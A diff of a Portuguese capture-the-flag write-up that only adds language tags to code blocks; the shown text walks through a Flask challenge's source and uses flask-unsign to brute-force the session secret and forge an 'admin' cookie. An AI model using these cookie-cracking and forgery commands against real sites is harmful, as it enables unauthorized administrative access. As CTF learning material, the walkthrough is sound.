@@ -19,7 +19,7 @@ Ao acessar o site, vemos uma pagina de login com inputs para acessar logar, cria
 
 O codigo da aplicacao web foi disponibilizado no desafio, bati o olho nas paginas estaticas e nao achei nada muito interessante, mas no codigo do backend que foi feito em Python usando o framework Flask, achei alguns metodos. E entre eles achei o seguinte metodo:
 
-```
+```py
 @app.route('/image/<image_id>')
 def image(image_id):
     """Display the image if user is admin or redirect with missing permissions."""
@@ -42,7 +42,7 @@ Logo, percebi que esse era o metodo que eu deveria usar para pegar a flag. Se an
 
 Ao procurar o trecho de codigo que consigo manipular esse dado achei o seguinte metodo:
 
-```
+```py
 @app.route('/register', methods=['GET', 'POST'])
 def register():
     """Handle user registration."""
@@ -85,7 +85,7 @@ Como podemos ver, esse metodo eh para criar usuarios, voce passa o **username** 
 
 Continuando... O problema aqui esta no seguinte trecho:
 
-```
+```py
 if username.startswith('admin') or '^' in username:
     flash("I don't like admins", "error")
     return render_template('register.html')
@@ -116,7 +116,7 @@ Pesquisando uma boa lista para poder rodar o brute force, achei [essa](https://g
 
 Enfim, rodei o seguinte comando:
 
-```
+```bash
 flask-unsign --unsign --cookie 'eyJ1c2VybmFtZSI6ImJyZyJ9.Z5f78g.uvTa-33GRRZ-Q3FHn80V6p0D4kY' --no-literal-eval -w jwt.secrets.list   
 ```
 
@@ -128,7 +128,7 @@ your_secret_key
 
 Agora acabou, so preciso mudar o Json e assina-lo com a chave secreta descoberta, usei o seguinte comando:
 
-```
+```bash
 flask-unsign --sign --cookie "{'username':'admin'}" --secret 'your_secret_key'
 ```
 
